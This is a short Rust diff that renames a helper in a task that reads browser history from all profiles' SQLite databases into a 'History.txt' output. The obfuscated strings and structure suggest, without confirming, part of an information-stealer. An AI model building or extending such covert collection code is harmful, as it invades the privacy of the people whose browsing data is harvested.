@@ -27,7 +27,7 @@ impl Task for HistoryTask {
     parent_name!("History.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let Some(mut history) = collect_from_all_profiles(&self.browser.profiles, get_history) else {
+        let Some(mut history) = collect_from_all_profiles(&self.browser.profiles, read_history) else {
             return
         };
         
@@ -38,7 +38,7 @@ impl Task for HistoryTask {
     }
 }
 
-fn get_history(profile: &Path) -> Option<Vec<History>> {
+fn read_history(profile: &Path) -> Option<Vec<History>> {
     let history_path = profile / s!("History");
     read_sqlite3_and_map_records(&history_path, s!("Urls"), extract_history_from_record)
 }
